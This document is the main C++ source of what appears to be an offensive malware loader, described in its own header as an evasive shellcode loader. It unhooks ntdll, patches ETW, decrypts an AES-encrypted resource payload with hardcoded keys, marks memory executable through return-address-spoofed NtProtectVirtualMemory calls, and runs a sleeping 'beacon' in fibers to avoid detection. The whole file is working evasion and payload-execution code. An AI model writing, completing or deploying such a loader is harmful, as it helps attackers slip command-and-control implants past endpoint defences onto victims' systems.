/* Evasive shellcode loader designed to hide its execution from userland/kernel-land detections */



#include <iostream>

#include "allocator.h"
#include "resolvers.h"
#include "unhook.h"
#include "retaddrspoof.h"
#include "defs.h"
#include "etw.h"
#include "AES.h"
#include "hook.h"
#include "rsrc.h"
#include "functions.h"






PVOID Gdgt = FindROPGadget(); // used all across the project for ret address spoofing
LPVOID InitialFiber;



unsigned char* rc4key;
unsigned long rc4keysize;
NTSTATUS status;
SIZE_T lpDataSize;



PLARGE_PAGE_INFORMATION pLPI;


unsigned char AesKey[] = { 0xBD, 0x19, 0x3D, 0x27, 0x69, 0x8C, 0xC6, 0x80, 0x86, 0x53, 0x8F, 0x3A, 0x53, 0x82, 0x16, 0x85, 0x9C, 0x01, 0x7C, 0xF3, 0xF9, 0xCA, 0x39, 0x1C, 0x08, 0x61, 0x6E, 0x05, 0x6F, 0x74, 0x7B, 0x08 };


unsigned char AesIv[] = { 0xAD, 0xC7, 0xC0, 0x5B, 0xA8, 0xAB, 0x80, 0x21, 0x95, 0x8E, 0x46, 0xD6, 0x15, 0x6B, 0x8B, 0xA0 };



/* AES vars */

PBYTE AesCipherText;

BOOL decryption;

PVOID pPlainBuffer = nullptr;
DWORD PlainBufferSize = 0;

PVOID ptr = nullptr;
DWORD ResourceSize;


LPVOID Creation = nullptr;
PVOID lpParameter = nullptr;



int main() {


	FlushNTDLL();
	PatchETW();

	GetFromRc(ResourceSize, ptr);
	AesCipherText = (PBYTE)malloc((SIZE_T)ResourceSize);

	RetSpoofCall((void*)memcpy, 3, Gdgt, AesCipherText, ptr, (SIZE_T)ResourceSize);

	decryption = AESDecrypt(
		AesCipherText,
		ResourceSize,
		AesKey,
		AesIv,
		&pPlainBuffer,
		&PlainBufferSize
	);

	if (!decryption) {
		std::cout << "[+] Decryption UnSuccessful" << std::endl;
		return -1;
	}

	pLPI = allocate_large_page(PlainBufferSize);

	place_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);

	free(AesCipherText);

	delete[] pPlainBuffer;


	HookFunction(Sleep, FiberSwitcher);

	InitialFiber = (LPVOID)RetSpoofCall((void*)e_ConvertThreadToFiber, 1, Gdgt, lpParameter); // converted the current thread to fiber (InitialFiber)


#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Converted current thread to fiber\n";
#endif


	ULONG OldAccessProtection = 0;

	status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &pLPI->lpPage, &pLPI->uSize, PAGE_EXECUTE_READ, &OldAccessProtection));
	
	NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status);

	Creation = RetSpoofCall((void*)e_CreateFiber, 3, Gdgt, NULL, (LPFIBER_START_ROUTINE)pLPI->lpData, NULL);  // Created a New fiber on the EntryPoint (PayloadFiber)


#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Created the payload fiber\n";
#endif



	while (true) { // main infinite loop
	

#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Switching to payload fiber\n";
#endif
		
	
	RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, Creation);
		


		// THIS PART IS EXECUTED AFTER THE BEACON CALLS SLEEP (FiberSwitcher)

#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Sleeping...\n";
#endif 

		DelayExecution(dwSleepTime);

		// and then back to loop start

	}
	

	return 0;
}